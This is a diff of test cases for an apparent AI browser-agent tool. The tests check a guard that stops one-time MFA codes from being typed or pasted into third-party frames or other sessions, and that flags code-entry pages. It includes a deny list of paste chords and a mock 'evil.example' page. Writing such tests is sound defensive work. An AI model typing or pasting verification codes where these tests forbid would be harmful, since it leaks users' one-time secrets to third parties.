+      tracker.register(v.id, v.pageDomain, CODE, v.browserSessionId);
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://www.manulife.ca/signin',
+        childUrl: 'https://manulife.b2clogin.com/mfa',
+        focusIn: 'child',
+        input: { action: 'press_key', key: '4' },
+        runtime,
+      });
+
+      expect((await new WebBrowserHandler().execute(ctx)).success).toBe(true);
+      expect(page.keyboard.press).toHaveBeenCalledWith('4');
+    });
+
+    it('refuses on the right page in another browser session', async () => {
+      const { runtime } = trackedRuntime();
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'main',
+        input: { action: 'press_key', key: '4' },
+        runtime,
+        sessionId: 'sess-2',
+      });
+
+      expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: KEY_REFUSAL });
+      expect(page.keyboard.press).not.toHaveBeenCalled();
+    });
+
+    it('fails closed when focus cannot be resolved', async () => {
+      const { runtime } = trackedRuntime();
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'unresolvable',
+        input: { action: 'press_key', key: '4' },
+        runtime,
+      });
+
+      expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: KEY_REFUSAL });
+      expect(page.keyboard.press).not.toHaveBeenCalled();
+    });
+
+    it('fails closed when the verification lookup fails', async () => {
+      const { runtime, listActive } = trackedRuntime();
+      listActive.mockRejectedValueOnce(new Error('db down'));
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'main',
+        input: { action: 'press_key', key: '4' },
+        runtime,
+      });
+
+      expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: KEY_REFUSAL });
+      expect(page.keyboard.press).not.toHaveBeenCalled();
+    });
+
+    it.each([
+      'Shift+4', 'Digit4', 'Numpad4', 'KeyA', 'a', 'Shift+A', '+', 'Shift++',
+      // Left/Right modifier names and key codes outside any pattern still type (fail closed).
+      'ShiftLeft+4', 'AltRight+Digit4', 'Shift+Digit8', 'Minus', 'NumpadAdd', 'Space',
+    ])('treats %s as a character', async (key) => {
+      const { runtime } = trackedRuntime();
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'child',
+        input: { action: 'press_key', key },
+        runtime,
+      });
+
+      expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: KEY_REFUSAL });
+      expect(page.keyboard.press).not.toHaveBeenCalled();
+    });
+
+    it('always allows named non-printing keys and Control/Meta chords, without a lookup', async () => {
+      const { runtime, listActive } = trackedRuntime();
+      const keys = [
+        'Enter', 'Tab', 'Backspace', 'ArrowLeft', 'ArrowDown', 'Escape', 'Control+a', 'Control+A', 'Meta+C',
+        'ControlOrMeta+a', 'ControlLeft+Digit4', 'Shift+Tab', 'Shift', 'AltRight', 'F5', 'PageDown',
+      ];
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'child',
+        input: { actions: keysBatch(keys) },
+        runtime,
+      });
+
+      expect((await new WebBrowserHandler().execute(ctx)).success).toBe(true);
+      expect(page.keyboard.press.mock.calls.map((c) => c[0])).toEqual(keys);
+      expect(listActive).not.toHaveBeenCalled();
+    });
+
+    it.each(['Control+V', 'Meta+V', 'ControlOrMeta+v', 'MetaLeft+KeyV', 'Shift+Insert'])(
+      'refuses the paste chord %s into a third-party frame while a code is tracked',
+      async (key) => {
+        const { runtime } = trackedRuntime();
+        const { ctx, page } = focusCtx({
+          topUrl: 'https://login.aircanada.com/mfa',
+          childUrl: 'https://chat.widgetvendor.com/frame',
+          focusIn: 'child',
+          input: { action: 'press_key', key },
+          runtime,
+        });
+
+        expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: KEY_REFUSAL });
+        expect(page.keyboard.press).not.toHaveBeenCalled();
+      },
+    );
+
+    it('allows a paste chord on the verification\'s own page in its session', async () => {
+      const { runtime } = trackedRuntime();
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'main',
+        input: { action: 'press_key', key: 'Meta+V' },
+        runtime,
+      });
+
+      expect((await new WebBrowserHandler().execute(ctx)).success).toBe(true);
+      expect(page.keyboard.press).toHaveBeenCalledWith('Meta+V');
+    });
+
+    it('refuses a paste chord when focus cannot be resolved', async () => {
+      const { runtime } = trackedRuntime();
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'unresolvable',
+        input: { action: 'press_key', key: 'Control+V' },
+        runtime,
+      });
+
+      expect(await new WebBrowserHandler().execute(ctx)).toEqual({ success: false, error: KEY_REFUSAL });
+      expect(page.keyboard.press).not.toHaveBeenCalled();
+    });
+
+    it('presses characters freely while no code is tracked', async () => {
+      const { runtime, listActive } = makeRuntime([verification({})]);
+      const { ctx, page } = focusCtx({
+        topUrl: 'https://login.aircanada.com/mfa',
+        childUrl: 'https://chat.widgetvendor.com/frame',
+        focusIn: 'child',
+        input: { action: 'press_key', key: '4' },
+        runtime,
+      });
+
+      expect((await new WebBrowserHandler().execute(ctx)).success).toBe(true);
+      expect(page.keyboard.press).toHaveBeenCalledWith('4');
+      expect(listActive).not.toHaveBeenCalled();
+    });
+  });
+
+  it('adds verification_suspected when the page shows a code-entry screen', async () => {
+    const { runtime } = makeRuntime([]);
+    const { ctx, page } = verifyCtx('https://login.aircanada.com/mfa', { action: 'get_content' }, runtime);
+    page.evaluate.mockResolvedValue(['one-time-code-input', 'delivery-choice']);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect((result.data as Record<string, unknown>).verification_suspected).toEqual({
+        page_domain: 'aircanada.com',
+        signals: ['one-time-code-input', 'delivery-choice'],
+      });
+    }
+  });
+
+  it('omits verification_suspected on an ordinary page', async () => {
+    const { runtime } = makeRuntime([]);
+    const { ctx, page } = verifyCtx('https://login.aircanada.com/', { action: 'get_content' }, runtime);
+    page.evaluate.mockResolvedValue([]);
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    if (result.success) expect('verification_suspected' in (result.data as object)).toBe(false);
+  });
+
+  it('without the verification runtime: no guard, no tracking, no hint', async () => {
+    const page = makeMockPage('page', vi.fn(), 'https://evil.example/');
+    page.evaluate.mockResolvedValue(['one-time-code-input']);
+    const session = new BrowserSession({} as unknown as BrowserContext, page as unknown as Page);
+    const browserService = {
+      getOrCreateSession: vi.fn().mockResolvedValue({ sessionId: 'sess-1', session }),
+      closeSession: vi.fn().mockResolvedValue(undefined),
+    } as unknown as BrowserService;
+    const ctx = { input: { action: 'type', selector: '#code', text: CODE }, log: logger, browserService } as unknown as ToolContext;
+
+    const result = await new WebBrowserHandler().execute(ctx);
+
+    expect(result.success).toBe(true);
+    if (result.success) expect('verification_suspected' in (result.data as object)).toBe(false);
+    expect(session.redactInjectedSecrets(CODE)).toBe(CODE);
   });
 });
